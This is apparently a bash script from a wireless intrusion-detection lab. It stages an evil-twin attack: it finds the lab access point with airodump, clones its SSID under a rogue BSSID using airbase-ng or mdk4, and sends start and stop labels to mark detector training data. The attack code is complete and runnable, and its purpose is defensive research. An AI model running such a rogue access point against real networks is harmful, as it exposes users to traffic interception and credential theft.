#!/usr/bin/env bash
# Single-BSSID evil twin + labeling (Kali / monitor mode).
# Usage: sudo -E ./host/attacks/attack_evil_twin.sh
#
# NOT mdk4 random beacon flood (that already failed: tot ~1.3×).
# This clones the lab SSID with ONE rogue BSSID on the victim channel so
# firmware win_bssid can go 1 → 2. Flash win_bssid firmware first. Not a train
# baseline. Do not add unique_bssid to model.h tonight.
#
# Prefers airbase-ng; falls back to mdk4 b -n -a -c (fixed BSSID, modest pps).
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

LABEL_SENT=0
_cleanup_label() {
  if [[ "${LABEL_SENT}" -eq 1 ]]; then
    echo ">>> cleanup: sending STOP EVIL_TWIN" >&2
    send_label STOP EVIL_TWIN || true
    LABEL_SENT=0
  fi
}
trap _cleanup_label EXIT

if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  _alt="$(iw dev 2>/dev/null | awk '/^[[:space:]]*Interface /{iface=$2} /^[[:space:]]*type monitor/{print iface; exit}')"
  if [[ -n "${_alt:-}" ]]; then
    MON_IFACE="$_alt"
    export NIDS_MON_IFACE="$_alt"
  else
    bash "${DIR}/prepare_wifi.sh" monitor
    MON_IFACE="${NIDS_MON_IFACE:-$MON_IFACE}"
  fi
fi
if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo ">>> ERROR: no monitor iface" >&2
  exit 1
fi

ensure_label_path || exit 1

DURATION="${NIDS_EVIL_TWIN_SEC:-60}"
PPS="${NIDS_EVIL_TWIN_PPS:-20}"
# Locally administered; must not equal the real AP.
ROGUE="${NIDS_ROGUE_BSSID:-02:13:37:00:00:01}"

BSSID=""
CHANNEL=""
if [[ -n "${NIDS_BSSID:-}" ]]; then
  BSSID="$NIDS_BSSID"
  CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
  echo ">>> Using forced NIDS_BSSID=${BSSID}"
elif [[ "${NIDS_SKIP_AP_SCAN:-0}" != "1" ]]; then
  if hit="$(airodump_find_ap "$MON_IFACE" "$SSID")"; then
    BSSID="${hit%% *}"
    CHANNEL="${hit##* }"
    export NIDS_BSSID="$BSSID"
    export NIDS_WIFI_CHANNEL="$CHANNEL"
  else
    echo ">>> WARN: airodump miss — falling back to live_state" >&2
    BSSID="$(_json_field ap_bssid 2>/dev/null || true)"
    CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
  fi
fi

if [[ -n "${CHANNEL:-}" && "$CHANNEL" != "null" && "$CHANNEL" != "0" ]]; then
  iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null \
    || iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null || true
fi

if [[ -n "${BSSID:-}" && "$BSSID" != "null" ]]; then
  rogue_l="$(echo "$ROGUE" | tr '[:upper:]' '[:lower:]')"
  real_l="$(echo "$BSSID" | tr '[:upper:]' '[:lower:]')"
  if [[ "$rogue_l" == "$real_l" ]]; then
    echo ">>> ERROR: rogue BSSID equals real AP (${BSSID}). Export NIDS_ROGUE_BSSID=..." >&2
    exit 1
  fi
fi

echo ">>> Monitor iface    : $MON_IFACE"
echo ">>> SSID (clone)     : $SSID"
echo ">>> Real AP BSSID    : ${BSSID:-unknown}"
echo ">>> Rogue BSSID      : $ROGUE"
echo ">>> Channel          : ${CHANNEL:-?}"
echo ">>> Duration         : ${DURATION}s"
echo ">>> Label host       : $(get_label_host):${LABEL_PORT}"
echo ">>> READY FOR EVIL_TWIN"

send_label START EVIL_TWIN
LABEL_SENT=1
sleep 0.5

set +e
rc=1
if command -v airbase-ng >/dev/null 2>&1; then
  echo ">>> airbase-ng -e ${SSID} -c ${CHANNEL:-1} -a ${ROGUE}"
  timeout "$DURATION" airbase-ng -e "$SSID" -c "${CHANNEL:-1}" -a "$ROGUE" "$MON_IFACE"
  rc=$?
elif command -v mdk4 >/dev/null 2>&1; then
  echo ">>> mdk4 b (single BSSID clone, not random flood) pps=${PPS}"
  timeout "$DURATION" mdk4 "$MON_IFACE" b -n "$SSID" -a "$ROGUE" -c "${CHANNEL:-1}" -s "$PPS"
  rc=$?
else
  echo ">>> ERROR: need airbase-ng (aircrack-ng) or mdk4" >&2
  send_label STOP EVIL_TWIN || true
  LABEL_SENT=0
  exit 1
fi
set -e

if [[ "$rc" -eq 124 ]]; then
  echo ">>> finished rc=124 (duration OK)"
elif [[ "$rc" -eq 0 ]]; then
  echo ">>> finished rc=0"
else
  echo ">>> WARN: attacker rc=${rc} — check this labeled slice" >&2
fi

sleep 1
send_label STOP EVIL_TWIN
LABEL_SENT=0
echo " >>> EVIL_TWIN FINISHED"
echo " >>> Next: sudo -E ./host/attacks/prepare_wifi.sh managed"
